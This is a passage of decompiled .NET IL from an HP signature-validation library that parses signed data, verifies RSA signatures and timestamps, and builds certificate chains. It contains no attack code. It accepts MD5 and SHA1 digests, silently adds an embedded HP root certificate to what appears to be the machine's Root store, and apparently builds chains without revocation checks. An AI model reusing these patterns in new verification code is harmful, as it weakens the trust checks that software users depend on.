    IL_000b:  newobj     instance void [HP.Common.System]HP.Common.System.Security.SignedDataIndex::.ctor(uint8[])
    IL_0010:  stfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0015:  ldarg.0
    IL_0016:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_001b:  callvirt   instance bool [HP.Common.System]HP.Common.System.Security.SignedDataIndex::FindTags()
    IL_0020:  brtrue.s   IL_002b

    IL_0022:  ldc.i4.m1
    IL_0023:  ret

    IL_0024:  ldarg.0
    IL_0025:  ldarg.3
    IL_0026:  stfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_002b:  ldarg.0
    IL_002c:  call       instance void HPValidateSignature.SignedObjectAsn::CleanUp()
    IL_0031:  ldarg.0
    IL_0032:  ldfld      uint8[] HPValidateSignature.SignedObjectAsn::signedDataOid
    IL_0037:  ldlen
    IL_0038:  conv.i4
    IL_0039:  newarr     [mscorlib]System.Byte
    IL_003e:  stloc.0
    IL_003f:  ldarg.1
    IL_0040:  ldarg.0
    IL_0041:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0046:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_SignedDataObjectId()
    IL_004b:  conv.i4
    IL_004c:  ldloc.0
    IL_004d:  ldc.i4.0
    IL_004e:  ldloc.0
    IL_004f:  ldlen
    IL_0050:  conv.i4
    IL_0051:  call       void [mscorlib]System.Buffer::BlockCopy(class [mscorlib]System.Array,
                                                                 int32,
                                                                 class [mscorlib]System.Array,
                                                                 int32,
                                                                 int32)
    IL_0056:  ldarg.0
    IL_0057:  ldfld      uint8[] HPValidateSignature.SignedObjectAsn::signedDataOid
    IL_005c:  ldloc.0
    IL_005d:  call       bool HPValidateSignature.SignedObjectAsn::CompareByteArrays(uint8[],
                                                                                     uint8[])
    IL_0062:  brfalse.s  IL_0071

    IL_0064:  ldarg.0
    IL_0065:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_006a:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_CertList()
    IL_006f:  brtrue.s   IL_0073

    IL_0071:  ldc.i4.m1
    IL_0072:  ret

    IL_0073:  ldarg.0
    IL_0074:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0079:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_CertListLen()
    IL_007e:  stloc.1
    IL_007f:  ldarg.0
    IL_0080:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0085:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_CertListData()
    IL_008a:  stloc.2
    IL_008b:  br.s       IL_00d3

    IL_008d:  ldarg.1
    IL_008e:  ldloca.s   certListData
    IL_0090:  ldc.i4.0
    IL_0091:  call       int64 [HP.Common.System]HP.Common.System.Security.AbstractSyntaxNotationType::GetCurrentTypeLen(uint8[],
                                                                                                                         int64&,
                                                                                                                         bool)
    IL_0096:  ldarg.1
    IL_0097:  ldloca.s   certListData
    IL_0099:  ldc.i4.0
    IL_009a:  call       int64 [HP.Common.System]HP.Common.System.Security.AbstractSyntaxNotationType::GetCurrentTagLen(uint8[],
                                                                                                                        int64&,
                                                                                                                        bool)
    IL_009f:  add
    IL_00a0:  stloc.s    length
    IL_00a2:  ldloc.s    length
    IL_00a4:  conv.ovf.i
    IL_00a5:  newarr     [mscorlib]System.Byte
    IL_00aa:  stloc.s    cert
    IL_00ac:  ldarg.1
    IL_00ad:  ldloc.2
    IL_00ae:  conv.i4
    IL_00af:  ldloc.s    cert
    IL_00b1:  ldc.i4.0
    IL_00b2:  ldloc.s    length
    IL_00b4:  conv.i4
    IL_00b5:  call       void [mscorlib]System.Buffer::BlockCopy(class [mscorlib]System.Array,
                                                                 int32,
                                                                 class [mscorlib]System.Array,
                                                                 int32,
                                                                 int32)
    IL_00ba:  ldloc.1
    IL_00bb:  ldloc.s    cert
    IL_00bd:  ldlen
    IL_00be:  conv.i4
    IL_00bf:  conv.i8
    IL_00c0:  sub
    IL_00c1:  stloc.1
    IL_00c2:  ldarg.0
    IL_00c3:  ldloc.s    cert
    IL_00c5:  call       instance bool HPValidateSignature.SignedObjectAsn::SetupMemStore(uint8[])
    IL_00ca:  brtrue.s   IL_00ce

    IL_00cc:  ldc.i4.m1
    IL_00cd:  ret

    IL_00ce:  ldloc.2
    IL_00cf:  ldloc.s    length
    IL_00d1:  add
    IL_00d2:  stloc.2
    IL_00d3:  ldloc.1
    IL_00d4:  ldc.i4.0
    IL_00d5:  conv.i8
    IL_00d6:  bgt.s      IL_008d

    IL_00d8:  ldarg.0
    IL_00d9:  ldarg.0
    IL_00da:  ldarg.1
    IL_00db:  ldarg.0
    IL_00dc:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_00e1:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_SignatureCertSerial()
    IL_00e6:  ldarg.0
    IL_00e7:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_00ec:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_SignatureCertSerialLen()
    IL_00f1:  call       string HPValidateSignature.SignedObjectAsn::CreateHexString(uint8[],
                                                                                     int64,
                                                                                     int64)
    IL_00f6:  call       instance class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 HPValidateSignature.SignedObjectAsn::FindCertInStore(string)
    IL_00fb:  stfld      class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 HPValidateSignature.SignedObjectAsn::sigCert
    IL_0100:  ldarg.0
    IL_0101:  ldfld      class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 HPValidateSignature.SignedObjectAsn::sigCert
    IL_0106:  brtrue.s   IL_010a

    IL_0108:  ldc.i4.m1
    IL_0109:  ret

    IL_010a:  ldarg.0
    IL_010b:  ldarg.0
    IL_010c:  ldfld      class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 HPValidateSignature.SignedObjectAsn::sigCert
    IL_0111:  callvirt   instance native int [mscorlib]System.Security.Cryptography.X509Certificates.X509Certificate::get_Handle()
    IL_0116:  stfld      native int HPValidateSignature.SignedObjectAsn::signerCert
    IL_011b:  ldloca.s   rsa
    IL_011d:  initobj    [mscorlib]System.Security.Cryptography.RSAParameters
    IL_0123:  ldarg.0
    IL_0124:  ldfld      class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 HPValidateSignature.SignedObjectAsn::sigCert
    IL_0129:  ldloca.s   rsa
    IL_012b:  call       bool HPValidateSignature.SignedObjectAsn::ConvertX509PublicKey(class [System]System.Security.Cryptography.X509Certificates.X509Certificate2,
                                                                                        valuetype [mscorlib]System.Security.Cryptography.RSAParameters&)
    IL_0130:  brtrue.s   IL_0134

    IL_0132:  ldc.i4.m1
    IL_0133:  ret

    IL_0134:  newobj     instance void [mscorlib]System.Security.Cryptography.RSACryptoServiceProvider::.ctor()
    IL_0139:  stloc.s    rsaManaged
    .try
    {
      IL_013b:  ldloc.s    rsaManaged
      IL_013d:  ldloc.3
      IL_013e:  callvirt   instance void [mscorlib]System.Security.Cryptography.RSA::ImportParameters(valuetype [mscorlib]System.Security.Cryptography.RSAParameters)
      IL_0143:  ldarg.0
      IL_0144:  ldarg.1
      IL_0145:  ldarg.2
      IL_0146:  call       instance uint8[] HPValidateSignature.SignedObjectAsn::ComputeAuthenticodeSigHash(uint8[],
                                                                                                            class [mscorlib]System.Security.Cryptography.HashAlgorithm)
      IL_014b:  stloc.s    authenticodeSigHash
      IL_014d:  ldarg.0
      IL_014e:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
      IL_0153:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_EncryptedDigest()
      IL_0158:  pop
      IL_0159:  ldarg.0
      IL_015a:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
      IL_015f:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_EncryptedDigestLen()
      IL_0164:  conv.ovf.i
      IL_0165:  newarr     [mscorlib]System.Byte
      IL_016a:  stloc.s    numArray2
      IL_016c:  ldarg.1
      IL_016d:  ldarg.0
      IL_016e:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
      IL_0173:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_EncryptedDigestData()
      IL_0178:  conv.i4
      IL_0179:  ldloc.s    numArray2
      IL_017b:  ldc.i4.0
      IL_017c:  ldloc.s    numArray2
      IL_017e:  ldlen
      IL_017f:  conv.i4
      IL_0180:  call       void [mscorlib]System.Buffer::BlockCopy(class [mscorlib]System.Array,
                                                                   int32,
                                                                   class [mscorlib]System.Array,
                                                                   int32,
                                                                   int32)
      IL_0185:  ldarg.2
      IL_0186:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::get_Hash()
      IL_018b:  ldlen
      IL_018c:  conv.i4
      IL_018d:  ldc.i4.s   20
      IL_018f:  bne.un.s   IL_019f

      IL_0191:  ldstr      "SHA1"
      IL_0196:  call       string [mscorlib]System.Security.Cryptography.CryptoConfig::MapNameToOID(string)
      IL_019b:  stloc.s    str
      IL_019d:  br.s       IL_01be

      IL_019f:  ldarg.2
      IL_01a0:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::get_Hash()
      IL_01a5:  ldlen
      IL_01a6:  conv.i4
      IL_01a7:  ldc.i4.s   32
      IL_01a9:  bne.un.s   IL_01b2

      IL_01ab:  ldstr      "2.16.840.1.101.3.4.2.1"
      IL_01b0:  br.s       IL_01bc

      IL_01b2:  ldstr      "MD5"
      IL_01b7:  call       string [mscorlib]System.Security.Cryptography.CryptoConfig::MapNameToOID(string)
      IL_01bc:  stloc.s    str
      IL_01be:  ldloc.s    rsaManaged
      IL_01c0:  ldloc.s    authenticodeSigHash
      IL_01c2:  ldloc.s    str
      IL_01c4:  ldloc.s    numArray2
      IL_01c6:  callvirt   instance bool [mscorlib]System.Security.Cryptography.RSACryptoServiceProvider::VerifyHash(uint8[],
                                                                                                                     string,
                                                                                                                     uint8[])
      IL_01cb:  brtrue.s   IL_01d5

      IL_01cd:  ldc.i4.m1
      IL_01ce:  stloc.s    V_13
      IL_01d0:  leave      IL_0293

      IL_01d5:  leave.s    IL_01e3

    }  // end .try
    finally
    {
      IL_01d7:  ldloc.s    rsaManaged
      IL_01d9:  brfalse.s  IL_01e2

      IL_01db:  ldloc.s    rsaManaged
      IL_01dd:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_01e2:  endfinally
    }  // end handler
    IL_01e3:  ldstr      "-----BEGIN CERTIFICATE-----MIIDrDCCApSgAwIBAgIQM2O"
    + "00UXfpQityCo2+LaytDANBgkqhkiG9w0BAQUFADBw\nMQswCQYDVQQGEwJVUzEgMB4GA1UEC"
    + "hMXSGV3bGV0dC1QYWNrYXJkIENvbXBhbnkx\nPzA9BgNVBAMTNkhld2xldHQtUGFja2FyZCB"
    + "QcmludGluZyBEZXZpY2UgSW5mcmFz\ndHJ1Y3R1cmUgUm9vdCBDQTAeFw0wNTA1MjQwMDAwM"
    + "DBaFw0zODAxMDEyMzU5NTla\nMHAxCzAJBgNVBAYTAlVTMSAwHgYDVQQKExdIZXdsZXR0LVB"
    + "hY2thcmQgQ29tcGFu\neTE/MD0GA1UEAxM2SGV3bGV0dC1QYWNrYXJkIFByaW50aW5nIERld"
    + "mljZSBJbmZy\nYXN0cnVjdHVyZSBSb290IENBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMII"
    + "BCgKC\nAQEAoT+gCaPVpaL3pZhIzso7zBiUxEldsASpXzfgUQdguxJsNVIoqNOQ3IUefmUf\n"
    + "dfmYrf0ksh0bBNwVp7JlP/vtK01EbXefRHVRPwVIjYqmMPrOUjfVAam8SrOnA3rw\nVxyBJR"
    + "edg2+gnwkZQ4prPKkMcnyd1p1/86SQPsLGJJx9zRleZ7Ix5QKJAGeH1ED0\n89E7uJYbOsd1"
    + "XclsdunlNByrG9Z9b2/l95YaF3GLSiB4g82/flfEw7lZOtjBMHiL\nEl0BUTRMuaSherT5KD"
    + "W5mApE4R82UvnPNTyVz2yb7DTU+MBc4WRClV/wtj2GkVaA\nvt1KyUODNujmkMAtI565aJFg"
    + "rQIDAQABo0IwQDASBgNVHRMBAf8ECDAGAQH/AgEB\nMAsGA1UdDwQEAwIBBjAdBgNVHQ4EFg"
    + "QUjPJcdcgMB+Kxa9uR0J3xCg9pdp4wDQYJ\nKoZIhvcNAQEFBQADggEBAEu1SPC8j53+eHkh"
    + "9uYrj+38+Zl7sd0dLxOZdQ+cQs67\nahOKYcXU9kBAnKDNIfIXP1tnMbBTxCSG2WCum42cbr"
    + "dvg1FxeQkY/bRyiDZgijGm\nEAsXCqGd1HJzCbLIjcTbqzXBjUWulj0KP743GgjTGw1+Le8B"
    + "+V7/8nscFsdxXdas\nff6/fWXYWuiKtJq21mFq9+5fJNP6ynADccoq3h97icwf6c79TQ/Kl9"
    + "+XFiv8KJfK\nZF4pY0jRYytcZ/VaiMSE58IhbCMN/TyHoGGiZL5j1AqRFIogL3SRfopDtYfm"
    + "uYf+\nQBZnAFq20BlsBWDioLeN3S/l6zOLxOkoHuWibN6Wg8A=\n-----END CERTIFICATE-"
    + "----"
    IL_01e8:  ldstr      "-----BEGIN CERTIFICATE-----"
    IL_01ed:  ldstr      ""
    IL_01f2:  call       instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_01f7:  ldstr      "-----END CERTIFICATE-----"
    IL_01fc:  ldstr      ""
    IL_0201:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0206:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_020b:  newobj     instance void [System]System.Security.Cryptography.X509Certificates.X509Certificate2::.ctor(uint8[])
    IL_0210:  stloc.s    certificate
    IL_0212:  ldc.i4.6
    IL_0213:  ldc.i4.2
    IL_0214:  newobj     instance void HPValidateSignature.HPX509Store::.ctor(valuetype [System]System.Security.Cryptography.X509Certificates.StoreName,
                                                                              valuetype [System]System.Security.Cryptography.X509Certificates.StoreLocation)
    IL_0219:  stloc.s    hpX509Store
    .try
    {
      IL_021b:  ldloc.s    hpX509Store
      IL_021d:  ldc.i4.1
      IL_021e:  callvirt   instance void HPValidateSignature.HPX509Store::Open(valuetype [System]System.Security.Cryptography.X509Certificates.OpenFlags)
      IL_0223:  ldloc.s    hpX509Store
      IL_0225:  ldloc.s    certificate
      IL_0227:  callvirt   instance void HPValidateSignature.HPX509Store::Add(class [System]System.Security.Cryptography.X509Certificates.X509Certificate2)
      IL_022c:  leave.s    IL_023a

    }  // end .try
    finally
    {
      IL_022e:  ldloc.s    hpX509Store
      IL_0230:  brfalse.s  IL_0239

      IL_0232:  ldloc.s    hpX509Store
      IL_0234:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0239:  endfinally
    }  // end handler
    IL_023a:  ldarg.0
    IL_023b:  ldarg.0
    IL_023c:  ldfld      native int HPValidateSignature.SignedObjectAsn::memCertStore
    IL_0241:  ldarg.0
    IL_0242:  ldfld      native int HPValidateSignature.SignedObjectAsn::signerCert
    IL_0247:  ldc.i4.1
    IL_0248:  call       instance uint32 HPValidateSignature.SignedObjectAsn::VerifyCertChain(native int,
                                                                                              native int,
                                                                                              bool)
    IL_024d:  stloc.s    num2
    IL_024f:  ldc.i4.0
    IL_0250:  stloc.s    timeCheck
    IL_0252:  ldloc.s    num2
    IL_0254:  brfalse.s  IL_0260

    IL_0256:  ldloc.s    num2
    IL_0258:  ldc.i4.1
    IL_0259:  beq.s      IL_025d

    IL_025b:  ldc.i4.m1
    IL_025c:  ret

    IL_025d:  ldc.i4.1
    IL_025e:  stloc.s    timeCheck
    IL_0260:  ldarg.0
    IL_0261:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0266:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_NonAuthAttributes()
    IL_026b:  ldc.i4.0
    IL_026c:  conv.i8
    IL_026d:  ceq
    IL_026f:  ldloc.s    timeCheck
    IL_0271:  and
    IL_0272:  brfalse.s  IL_0276

    IL_0274:  ldc.i4.m1
    IL_0275:  ret

    IL_0276:  ldarg.0
    IL_0277:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_027c:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_NonAuthAttributes()
    IL_0281:  brfalse.s  IL_028e

    IL_0283:  ldarg.0
    IL_0284:  ldarg.1
    IL_0285:  ldloc.s    timeCheck
    IL_0287:  call       instance bool HPValidateSignature.SignedObjectAsn::VerifyTimeStamp(uint8[],
                                                                                            bool)
    IL_028c:  brfalse.s  IL_0290

    IL_028e:  ldc.i4.1
    IL_028f:  ret

    IL_0290:  ldc.i4.s   -3
    IL_0292:  ret

    IL_0293:  ldloc.s    V_13
    IL_0295:  ret
  } // end of method SignedObjectAsn::ValidateSignature

  .method public hidebysig static class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 
          GetRootCert(class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 cert) cil managed
  {
    // Code size       80 (0x50)
    .maxstack  3
    .locals init ([0] class [System]System.Security.Cryptography.X509Certificates.X509Chain ch)
    IL_0000:  newobj     instance void [System]System.Security.Cryptography.X509Certificates.X509Chain::.ctor()
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  callvirt   instance class [System]System.Security.Cryptography.X509Certificates.X509ChainPolicy [System]System.Security.Cryptography.X509Certificates.X509Chain::get_ChainPolicy()
    IL_000c:  ldc.i4.0
    IL_000d:  callvirt   instance void [System]System.Security.Cryptography.X509Certificates.X509ChainPolicy::set_RevocationMode(valuetype [System]System.Security.Cryptography.X509Certificates.X509RevocationMode)
    IL_0012:  ldloc.0
    IL_0013:  callvirt   instance class [System]System.Security.Cryptography.X509Certificates.X509ChainPolicy [System]System.Security.Cryptography.X509Certificates.X509Chain::get_ChainPolicy()
    IL_0018:  ldc.i4.1
    IL_0019:  callvirt   instance void [System]System.Security.Cryptography.X509Certificates.X509ChainPolicy::set_RevocationFlag(valuetype [System]System.Security.Cryptography.X509Certificates.X509RevocationFlag)
    IL_001e:  ldloc.0
    IL_001f:  callvirt   instance class [System]System.Security.Cryptography.X509Certificates.X509ChainPolicy [System]System.Security.Cryptography.X509Certificates.X509Chain::get_ChainPolicy()
    IL_0024:  ldc.i4.8
    IL_0025:  callvirt   instance void [System]System.Security.Cryptography.X509Certificates.X509ChainPolicy::set_VerificationFlags(valuetype [System]System.Security.Cryptography.X509Certificates.X509VerificationFlags)
    IL_002a:  ldloc.0
    IL_002b:  ldarg.0
    IL_002c:  callvirt   instance bool [System]System.Security.Cryptography.X509Certificates.X509Chain::Build(class [System]System.Security.Cryptography.X509Certificates.X509Certificate2)
    IL_0031:  pop
    IL_0032:  ldloc.0
    IL_0033:  callvirt   instance class [System]System.Security.Cryptography.X509Certificates.X509ChainElementCollection [System]System.Security.Cryptography.X509Certificates.X509Chain::get_ChainElements()
    IL_0038:  ldloc.0
    IL_0039:  callvirt   instance class [System]System.Security.Cryptography.X509Certificates.X509ChainElementCollection [System]System.Security.Cryptography.X509Certificates.X509Chain::get_ChainElements()
    IL_003e:  callvirt   instance int32 [System]System.Security.Cryptography.X509Certificates.X509ChainElementCollection::get_Count()
    IL_0043:  ldc.i4.1
    IL_0044:  sub
    IL_0045:  callvirt   instance class [System]System.Security.Cryptography.X509Certificates.X509ChainElement [System]System.Security.Cryptography.X509Certificates.X509ChainElementCollection::get_Item(int32)
    IL_004a:  callvirt   instance class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 [System]System.Security.Cryptography.X509Certificates.X509ChainElement::get_Certificate()
    IL_004f:  ret
  } // end of method SignedObjectAsn::GetRootCert

  .method public hidebysig static bool  CompareByteArrays(uint8[] obj1,
                                                          uint8[] obj2) cil managed
  {
    // Code size       36 (0x24)
    .maxstack  3
    .locals init ([0] int32 index)
    IL_0000:  ldarg.0
    IL_0001:  ldlen
    IL_0002:  conv.i4
    IL_0003:  ldarg.1
    IL_0004:  ldlen
    IL_0005:  conv.i4
    IL_0006:  beq.s      IL_000a

    IL_0008:  ldc.i4.0
    IL_0009:  ret

    IL_000a:  ldc.i4.0
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_001c

    IL_000e:  ldarg.0
    IL_000f:  ldloc.0
    IL_0010:  ldelem.u1
    IL_0011:  ldarg.1
    IL_0012:  ldloc.0
    IL_0013:  ldelem.u1
    IL_0014:  beq.s      IL_0018

    IL_0016:  ldc.i4.0
    IL_0017:  ret

    IL_0018:  ldloc.0
    IL_0019:  ldc.i4.1
    IL_001a:  add
    IL_001b:  stloc.0
    IL_001c:  ldloc.0
    IL_001d:  ldarg.0
    IL_001e:  ldlen
    IL_001f:  conv.i4
    IL_0020:  blt.s      IL_000e

    IL_0022:  ldc.i4.1
    IL_0023:  ret
  } // end of method SignedObjectAsn::CompareByteArrays

  .method private hidebysig instance bool 
          VerifyTimeStamp(uint8[] obj,
                          bool timeCheck) cil managed
  {
    // Code size       731 (0x2db)
    .maxstack  8
    .locals init ([0] uint8[] numArray1,
             [1] class [mscorlib]System.Security.Cryptography.HashAlgorithm hashAlgorithm,
             [2] uint8[] numArray2,
             [3] string hexString,
             [4] class [mscorlib]System.Security.Cryptography.RSACryptoServiceProvider rsaManaged,
             [5] valuetype [mscorlib]System.Security.Cryptography.RSAParameters rsa,
             [6] class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 certInStore,
             [7] bool V_7,
             [8] uint32 V_8,
             [9] uint8[] numArray3,
             [10] uint8[] buffer,
             [11] uint8[] numArray4,
             [12] valuetype [mscorlib]System.DateTime dateTime)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0006:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_TimeHashObjectIdLen()
    IL_000b:  conv.ovf.i
    IL_000c:  newarr     [mscorlib]System.Byte
    IL_0011:  stloc.0
    IL_0012:  ldarg.1
    IL_0013:  ldarg.0
    IL_0014:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0019:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_TimestampHashObjectId()
    IL_001e:  conv.i4
    IL_001f:  ldloc.0
    IL_0020:  ldc.i4.0
    IL_0021:  ldloc.0
    IL_0022:  ldlen
    IL_0023:  conv.i4
    IL_0024:  call       void [mscorlib]System.Buffer::BlockCopy(class [mscorlib]System.Array,
                                                                 int32,
                                                                 class [mscorlib]System.Array,
                                                                 int32,
                                                                 int32)
    IL_0029:  ldloc.0
    IL_002a:  ldarg.0
    IL_002b:  ldfld      uint8[] HPValidateSignature.SignedObjectAsn::sha1Oid
    IL_0030:  call       bool HPValidateSignature.SignedObjectAsn::CompareByteArrays(uint8[],
                                                                                     uint8[])
    IL_0035:  brfalse.s  IL_004f

    IL_0037:  ldstr      "SHA1"
    IL_003c:  call       string [mscorlib]System.Security.Cryptography.CryptoConfig::MapNameToOID(string)
    IL_0041:  pop
    IL_0042:  ldstr      "SHA1"
    IL_0047:  call       class [mscorlib]System.Security.Cryptography.HashAlgorithm [mscorlib]System.Security.Cryptography.HashAlgorithm::Create(string)
    IL_004c:  stloc.1
    IL_004d:  br.s       IL_008b

    IL_004f:  ldloc.0
    IL_0050:  ldarg.0
    IL_0051:  ldfld      uint8[] HPValidateSignature.SignedObjectAsn::sha256Oid
    IL_0056:  call       bool HPValidateSignature.SignedObjectAsn::CompareByteArrays(uint8[],
                                                                                     uint8[])
    IL_005b:  brfalse.s  IL_0065

    IL_005d:  newobj     instance void [HP.Common.System]HP.Common.System.Security.Cryptography.WinSHA256::.ctor()
    IL_0062:  stloc.1
    IL_0063:  br.s       IL_008b

    IL_0065:  ldloc.0
    IL_0066:  ldarg.0
    IL_0067:  ldfld      uint8[] HPValidateSignature.SignedObjectAsn::md5Oid
    IL_006c:  call       bool HPValidateSignature.SignedObjectAsn::CompareByteArrays(uint8[],
                                                                                     uint8[])
    IL_0071:  brtrue.s   IL_0075

    IL_0073:  ldc.i4.0
    IL_0074:  ret

    IL_0075:  ldstr      "MD5"
    IL_007a:  call       string [mscorlib]System.Security.Cryptography.CryptoConfig::MapNameToOID(string)
    IL_007f:  pop
    IL_0080:  ldstr      "MD5"
    IL_0085:  call       class [mscorlib]System.Security.Cryptography.HashAlgorithm [mscorlib]System.Security.Cryptography.HashAlgorithm::Create(string)
    IL_008a:  stloc.1
    IL_008b:  ldarg.0
    IL_008c:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_0091:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_TimeSignature()
    IL_0096:  brtrue.s   IL_00a0

    IL_0098:  ldloc.1
    IL_0099:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Clear()
    IL_009e:  ldc.i4.0
    IL_009f:  ret

    IL_00a0:  ldarg.0
    IL_00a1:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_00a6:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_TimeDigestLen()
    IL_00ab:  conv.ovf.i
    IL_00ac:  newarr     [mscorlib]System.Byte
    IL_00b1:  stloc.2
    IL_00b2:  ldarg.1
    IL_00b3:  ldarg.0
    IL_00b4:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_00b9:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_TimeDigest()
    IL_00be:  conv.i4
    IL_00bf:  ldloc.2
    IL_00c0:  ldc.i4.0
    IL_00c1:  ldloc.2
    IL_00c2:  ldlen
    IL_00c3:  conv.i4
    IL_00c4:  call       void [mscorlib]System.Buffer::BlockCopy(class [mscorlib]System.Array,
                                                                 int32,
                                                                 class [mscorlib]System.Array,
                                                                 int32,
                                                                 int32)
    IL_00c9:  ldloc.1
    IL_00ca:  ldarg.1
    IL_00cb:  ldarg.0
    IL_00cc:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_00d1:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_EncryptedDigestData()
    IL_00d6:  conv.i4
    IL_00d7:  ldarg.0
    IL_00d8:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_00dd:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_EncryptedDigestLen()
    IL_00e2:  conv.i4
    IL_00e3:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[],
                                                                                                            int32,
                                                                                                            int32)
    IL_00e8:  ldloc.2
    IL_00e9:  call       bool HPValidateSignature.SignedObjectAsn::CompareByteArrays(uint8[],
                                                                                     uint8[])
    IL_00ee:  brtrue.s   IL_00f8

    IL_00f0:  ldloc.1
    IL_00f1:  callvirt   instance void [mscorlib]System.Security.Cryptography.HashAlgorithm::Clear()
    IL_00f6:  ldc.i4.0
    IL_00f7:  ret

    IL_00f8:  ldarg.1
    IL_00f9:  ldarg.0
    IL_00fa:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_00ff:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_TimeCertSerial()
    IL_0104:  ldarg.0
    IL_0105:  ldfld      class [HP.Common.System]HP.Common.System.Security.SignedDataIndex HPValidateSignature.SignedObjectAsn::sdIndex
    IL_010a:  callvirt   instance int64 [HP.Common.System]HP.Common.System.Security.SignedDataIndex::get_TimeCertSerialLen()
    IL_010f:  call       string HPValidateSignature.SignedObjectAsn::CreateHexString(uint8[],
                                                                                     int64,
                                                                                     int64)
    IL_0114:  stloc.3
    IL_0115:  newobj     instance void [mscorlib]System.Security.Cryptography.RSACryptoServiceProvider::.ctor()
    IL_011a:  stloc.s    rsaManaged
    IL_011c:  ldloca.s   rsa
    IL_011e:  initobj    [mscorlib]System.Security.Cryptography.RSAParameters
    IL_0124:  ldarg.0
    IL_0125:  ldloc.3
    IL_0126:  call       instance class [System]System.Security.Cryptography.X509Certificates.X509Certificate2 HPValidateSignature.SignedObjectAsn::FindCertInStore(string)
    IL_012b:  stloc.s    certInStore
